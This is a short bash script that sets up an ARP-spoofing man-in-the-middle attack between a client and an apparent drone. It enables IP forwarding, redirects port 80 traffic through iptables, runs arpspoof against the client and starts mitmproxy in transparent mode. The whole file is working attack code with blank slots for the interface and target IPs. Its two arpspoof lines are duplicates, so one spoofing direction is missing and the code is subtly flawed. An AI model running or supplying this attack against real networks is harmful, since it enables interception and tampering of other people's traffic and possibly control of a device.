#!/bin/bash

export INTERFACE=
export CLIENT_IP=
export DRONE_IP=

main () {
    sysctl -w net.ipv4.ip_forward=1
    iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 8080

    arpspoof -i $INTERFACE -t $CLIENT_IP $DRONE_IP &
    arpspoof -i $INTERFACE -t $CLIENT_IP $DRONE_IP &
    mitmproxy -T --host
}

# Call the main function
main